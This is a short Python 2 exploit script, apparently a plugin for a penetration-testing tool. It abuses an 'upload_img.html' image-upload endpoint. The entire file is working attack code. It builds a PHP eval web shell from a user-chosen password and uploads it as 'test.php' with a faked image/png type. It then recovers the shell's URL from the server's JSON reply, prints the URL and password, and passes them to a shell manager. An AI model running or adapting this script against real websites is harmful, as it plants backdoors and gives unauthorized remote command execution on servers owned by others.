import requests

from plugin.shell.shell_manage import post_shell_manage

def poc(url):
    try:
        if not url.endswith("upload_img.html"):
            print("[*] Please make sure the url end with 'upload_img.html'")
            exit()
        proxy = {'http': '127.0.0.1:8080'}
        upload_url = url + '?is_h5=2'
        cookie = raw_input("[*] Please input cookie:")
        password = raw_input("[*] Please enter the shell-password:")
        phpshell = "<?php eval($_POST['%s']);?>" % password
        header = {
            'User-Agent':
            'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0',
            'Accept':
            'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language':
            'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
            'Accept-Encoding':
            'gzip, deflate',
            'Cookie':
            cookie
        }
        upload_file = {
            'uploadDir': (None, 'avatar'),
            'is_thumb': (None, '1'),
            'filename': (None, ''),
            'id': (None, 'WU_FILE_4'),
            'name': (None, 'logo.png'),
            'type': (None, 'image/png'),
            'file': ('test.php', phpshell, 'image/png')
        }
        r = requests.post(upload_url, headers=header, files=upload_file)
        shell = url.replace('upload_img.html',
                            '') + r.json()['data']['img'].replace(
                                '_s.php', '.php')

        print("[*] The shell url: " + shell)
        print("[*] The shell password: " + password)
        post_shell_manage(shell,password)
    except Exception:
        pass
